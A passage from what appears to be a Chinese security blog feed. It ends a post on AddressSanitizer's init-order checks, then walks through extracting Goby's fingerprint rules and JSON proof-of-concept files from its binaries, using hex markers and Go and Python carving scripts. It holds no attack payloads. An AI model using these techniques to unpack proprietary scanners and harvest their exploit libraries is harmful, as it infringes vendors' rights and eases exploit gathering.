ASAN的这个检测方式很简单，就是在一个全局变量初始化过程中访问另一个全局变量之前检测要访问的全局变量是否已经完成初始化，但是很明显，这种动态检测在上述demo输出43的时候不会报告错误。</p><h3 id="Strict-init-order-checking"><a href="#Strict-init-order-checking" class="headerlink" title="Strict init-order checking"></a>Strict init-order checking</h3><p>  这个只是相对于Loose init-order checking更为严格了，只要进行访问就报告错误，这虽然能发现潜在的错误，但是也可能会触发误报。所以其实这两种方法各有千秋。为了解决这些问题，ASAN的此类漏洞扫描存在黑名单机制，把不想扫描的全局变量可以加入Blacklist来防止误报，但是可能会让漏洞研究人员多花点心思。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://clang.llvm.org/docs/AddressSanitizer.html">https://clang.llvm.org/docs/AddressSanitizer.html</a><br><a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">https://github.com/google/sanitizers/wiki/AddressSanitizer</a><br><a href="https://isocpp.org/wiki/faq/ctors#static-init-order">https://isocpp.org/wiki/faq/ctors#static-init-order</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AddressSanitizer-漏洞检测技术剖析&quot;&gt;&lt;a href=&quot;#AddressSanitizer-漏洞检测技术剖析&quot; class=&quot;headerlink&quot; title=&quot;AddressSanitizer 漏洞检测技术剖析&quot;&gt;&lt;/a&gt;AddressSani</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Goby指纹与POC提取复现</title>
    <link href="https://rainsec.cn/post/Goby%E6%8C%87%E7%BA%B9%E5%92%8CPOC%E6%8F%90%E5%8F%96.html"/>
    <id>https://rainsec.cn/post/Goby%E6%8C%87%E7%BA%B9%E5%92%8CPOC%E6%8F%90%E5%8F%96.html</id>
    <published>2022-09-30T02:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.371Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Goby指纹与POC提取复现"><a href="#Goby指纹与POC提取复现" class="headerlink" title="Goby指纹与POC提取复现"></a>Goby指纹与POC提取复现</h1><p>最近看了w8ay师傅发的关于提取Goby指纹的帖子，发现自己加入师傅的知识星球却一直没认真学习过实在是难顶嗷，根据师傅的帖子来复现自己提取一下，补上第一期的作业。</p><h2 id="Goby指纹提取"><a href="#Goby指纹提取" class="headerlink" title="Goby指纹提取"></a>Goby指纹提取</h2><p>首先是指纹提取，这里也分别准备了三个版本的Goby文件进行复现，分别是1.4.76、1.7.192和1.8.279</p><h3 id="1-4-76"><a href="#1-4-76" class="headerlink" title="1.4.76"></a>1.4.76</h3><p>因为版本比较低所以不需要我们手动去从goby程序里提crules，直接用winhex打开<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927205348.6efba3mc0j00.webp"><br>笔者从事的工作与Yara息息相关，但是从来没有深入的去了解Yara的原理和流程，只是把它当作加强版的正则，从来没有想过能用来进行指纹识别，愧疚愧疚~~</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927205630.2cfsp2nwmlus.webp"><br>到这里已经看到出现指纹了，接下来就是将指纹提取出来，笔者在复现的时候起初以为自己写过Yara规则，猜测每个规则都是rule_id开头，然后后面跟字段，妹有好好观察，最后还是老老实实寻找开始和结束段。<br>我们提取的内容应该是以rules_0开始，按照师傅的文章正是从default之后开始进行提取，所以开始字段为<code>64 65 66 61 75 6C 74 00</code> ，往下寻找结束的标记，从图上可以看出结束的标记为<code>66 6F 65 79 65</code><br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927210430.7efe7ytm4mc0.webp"></p><p>接下来就是将这两段之间的内容提取出来，笔者最近正好在学习Go，就用Go写了个辣眼的提取脚本</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"io/ioutil"</span>    <span class="token string">"fmt"</span>    <span class="token string">"strings"</span>    <span class="token string">"os"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/home/ubuntu/go/gopro/crules"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"read fail"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">Write</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    fileName <span class="token operator">:=</span> <span class="token string">"finger.txt"</span>    <span class="token keyword">var</span> d1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    f<span class="token punctuation">,</span> err3 <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span> <span class="token comment">//创建文件</span>    <span class="token keyword">if</span> err3 <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"create file fail"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    n2<span class="token punctuation">,</span> err3 <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>d1<span class="token punctuation">)</span> <span class="token comment">//写入文件(字节数组)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"写入 %d 个字节n"</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>    f<span class="token punctuation">.</span><span class="token function">Sync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    crules <span class="token operator">:=</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    start <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>crules<span class="token punctuation">,</span> <span class="token string">"\x64\x65\x66\x61\x75\x6C\x74\x00"</span><span class="token punctuation">)</span>    end <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>crules<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x66\x6F\x65\x79\x65\x00"</span><span class="token punctuation">)</span>    finger <span class="token operator">:=</span> crules<span class="token punctuation">[</span>start <span class="token punctuation">:</span> end<span class="token punctuation">]</span>    <span class="token function">Write</span><span class="token punctuation">(</span>finger<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927214744.5ysoua033fg0.webp"></p><p>真的辣眼睛，因为妹有做分割，真没眼看。。。。</p><p>接下来就是进行分割，观察不同的rule_id之间的字节<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927213623.3zwsqrnq73m0.webp"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927213654.3f5jzeybxji0.webp"><br>由此可以确定不同规则rule_id之间的分隔符为<code>\x00\x00\x00\x00\x73\x00</code> ,不同字段之间的分隔符为<code>\x00</code> </p><p>尝试对其进行拆分，这段写得太辣眼睛了，还是放师傅的脚本吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">filename <span class="token operator">=</span> <span class="token string">r"crules"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>start <span class="token operator">=</span> data<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">b"default\x00fofa"</span><span class="token punctuation">)</span>end <span class="token operator">=</span> data<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span>data <span class="token operator">=</span> data<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span>datas <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b"rule_id"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>sep <span class="token operator">=</span> <span class="token string">b"\x00"</span>options_set <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> item <span class="token keyword">in</span> datas<span class="token punctuation">:</span>    ff <span class="token operator">=</span> item<span class="token punctuation">.</span>split<span class="token punctuation">(</span>sep<span class="token punctuation">)</span>    rule_id <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    level <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    softhard <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    product <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    company <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    category <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    parent_category <span class="token operator">=</span> ff<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    dd <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"rule_id"</span><span class="token punctuation">:</span> rule_id<span class="token punctuation">,</span>        <span class="token string">"level"</span><span class="token punctuation">:</span> level<span class="token punctuation">,</span>        <span class="token string">"softhard"</span><span class="token punctuation">:</span> softhard<span class="token punctuation">,</span>        <span class="token string">"product"</span><span class="token punctuation">:</span> product<span class="token punctuation">,</span>        <span class="token string">"company"</span><span class="token punctuation">:</span> company<span class="token punctuation">,</span>        <span class="token string">"category"</span><span class="token punctuation">:</span> category<span class="token punctuation">,</span>        <span class="token string">"parent_category"</span><span class="token punctuation">:</span> parent_category<span class="token punctuation">,</span>        <span class="token string">"rules"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token punctuation">}</span>    bb <span class="token operator">=</span> <span class="token string">b'\x00'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ff<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> bb<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'\x00\x00\x00\x00\x73\x00'</span><span class="token punctuation">)</span>    _rr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> rr <span class="token keyword">in</span> s<span class="token punctuation">:</span>        _rules <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> rr<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'fofa'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        index <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rr<span class="token punctuation">)</span><span class="token punctuation">:</span>            prefixx <span class="token operator">=</span> <span class="token string">b"fofa\x00"</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> rr<span class="token punctuation">.</span>index<span class="token punctuation">(</span>prefixx<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefixx<span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            end <span class="token operator">=</span> rr<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">b'\x00'</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span>            match_way <span class="token operator">=</span> rr<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            _length <span class="token operator">=</span> rr<span class="token punctuation">[</span>end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>            content <span class="token operator">=</span> rr<span class="token punctuation">[</span>end <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>end <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> _length<span class="token punctuation">]</span>            index <span class="token operator">=</span> end <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> _length            _rules<span class="token punctuation">.</span>append<span class="token punctuation">(</span>                <span class="token punctuation">{</span>                    <span class="token string">"match"</span><span class="token punctuation">:</span> match_way<span class="token punctuation">,</span>                    <span class="token string">"content"</span><span class="token punctuation">:</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">)</span>        _rr2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>_rules<span class="token punctuation">)</span>    dd<span class="token punctuation">[</span><span class="token string">"rules"</span><span class="token punctuation">]</span> <span class="token operator">=</span> _rr2    results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dd<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"fofa.json"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">import</span> json    json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>results<span class="token punctuation">,</span> f<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后得到结果如下</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/Pasted-image-20220927223539.6p7nldhpe340.webp"></p><h3 id="1-7-192"><a href="#1-7-192" class="headerlink" title="1.7.192"></a>1.7.192</h3><p>1.7.192版本不在含有crules文件，它被包含在了可执行程序中，打开可执行程序可以看到其中引用了<code>github.com/rakyll/statik/fs</code> 库，官方的描述如下：<br><code>statik allows you to embed a directory of static files into your Go binary</code><br>根据师傅的文章，我们也可以查看fs的源码<br><a href="https://github.com/rakyll/statik/blob/master/fs/fs.go">fs.go的源码</a><br>发现该库即是生成了ZIP内嵌在程序中<br>笔者之前有过一些Misc经验（雾，这里列出常见的文件头</p><table><thead><tr><th>Type</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JEPG</td><td>FFD8FF</td><td>FFD9</td></tr><tr><td>PNG</td><td>89504E47</td><td>AE426082</td></tr><tr><td>GIF</td><td>47484638</td><td>003B</td></tr><tr><td>ZIP</td><td>504B0304</td><td>504B</td></tr><tr><td>TIFF</td><td>49492A00</td><td></td></tr><tr><td>XML</td><td>68746D6C3E</td><td></td></tr><tr><td>PDF</td><td>25504446</td><td></td></tr><tr><td>RAR</td><td>52617221</td><td></td></tr></tbody></table><p>这里搜索ZIP的格式头<code>50 4B 03 04</code> 即可定位到压缩包的起始位置</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/image.5ndi5mufazw0.png"></p><p>看到crules，就应该是这个压缩包了，接下来就是寻找结尾进行提取压缩包文件。因为<code>50 4B 03 04</code> 这段数据在文本中有很多，在进行提取的时候可以多选几个字节进行准确定位，这里师傅网友多定了一个字节到<code>50 4B 03 04 14 00 08 00 08 00</code></p><p>接下来寻找压缩包结尾，先看看<code>50 4B</code> 的搜索结果<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/image.2e4qv9eoqr28.png"></p><p>在搜索开始头的时候就能看到存在这么多的<code>50 4B</code> 如果直接提取到下一个<code>50 4B</code> 无法判断压缩包的准确性，借鉴师傅的解决方法，每次读字节并且尝试解压，代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author  : w8ay</span><span class="token keyword">import</span> zipfile<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIOfilename <span class="token operator">=</span> <span class="token string">"goby-cmd-linux"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> stream<span class="token punctuation">:</span>    data <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    start <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b'\x50\x4B\x03\x04\x14\x00\x08\x00\x08\x00'</span><span class="token punctuation">)</span>    end <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">1200</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    fenli <span class="token operator">=</span> data<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        fio <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>fenli<span class="token punctuation">)</span>        f <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span>fio<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>fenli<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>fenli<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fenli<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span> zipfile<span class="token punctuation">.</span>BadZipFile<span class="token punctuation">:</span>        end <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"test.zip"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>fenli<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功分离出crules_1.7.192，用之前的提取脚本提取即可</p><p><del>这个微微离谱的指纹还在</del></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/image.21ucigcs7ie8.png"></p><h2 id="Goby-Poc提取"><a href="#Goby-Poc提取" class="headerlink" title="Goby Poc提取"></a>Goby Poc提取</h2><p>Goby的POC分为json与go两种格式，本次只尝试提取json’格式（wtcldbq</p><p>用winhex打开可执行程序观察</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/image.7cr1bfp8q840.png"></p><p>可以直接确认Name段，那么提取数据的起始段也可以确认为<code>\x23\x7B\x0A\x20\x20\x22\x4E\x61\x6D\x65\x22\x3A\x20</code><br><del>（在看的时候搜索Name字段第二个处的CS字段与下面不同，不知道为啥师傅没有提取</del><br>结束段标记为<code>\x65\x0A\x7D\x0A\x66\x75\x6E\x63\x74\x69\x6F\x6E</code></p><p>暴力提取辣眼脚本：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"io/ioutil"</span>    <span class="token string">"fmt"</span>    <span class="token string">"strings"</span>    <span class="token string">"os"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    f<span class="token punctuation">,</span> err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"goby_1.8"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"read fail"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">Write</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fileName <span class="token operator">:=</span> <span class="token string">"finger.json"</span>    <span class="token keyword">var</span> d1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    f<span class="token punctuation">,</span> err3 <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span> <span class="token comment">//创建文件</span>    <span class="token keyword">if</span> err3 <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"create file fail"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    n2<span class="token punctuation">,</span> err3 <span class="token operator">:=</span> f<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>d1<span class="token punctuation">)</span> <span class="token comment">//写入文件(字节数组)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"写入 %d 个字节n"</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>    f<span class="token punctuation">.</span><span class="token function">Sync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    crules <span class="token operator">:=</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    start <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>crules<span class="token punctuation">,</span> <span class="token string">"\x23\x7B\x0A\x20\x20\x22\x4E\x61\x6D\x65\x22\x3A\x20"</span><span class="token punctuation">)</span>    end <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>crules<span class="token punctuation">,</span> <span class="token string">"\x65\x0A\x7D\x0A\x66\x75\x6E\x63\x74\x69\x6F\x6E"</span><span class="token punctuation">)</span>    finger <span class="token operator">:=</span> crules<span class="token punctuation">[</span>start <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">:</span> end <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span>    <span class="token function">Write</span><span class="token punctuation">(</span>finger<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取结果如下<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220928/image.3m0ztpkxvt40.png"></p><p>但是存在一些不可见字符干扰，后续再优化</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先是 W8ay师傅太强了orz，后面到了逆向yara虚拟机的程度，对字符处理也很细节，学，学无止境。<br>wtcl。。<br><img 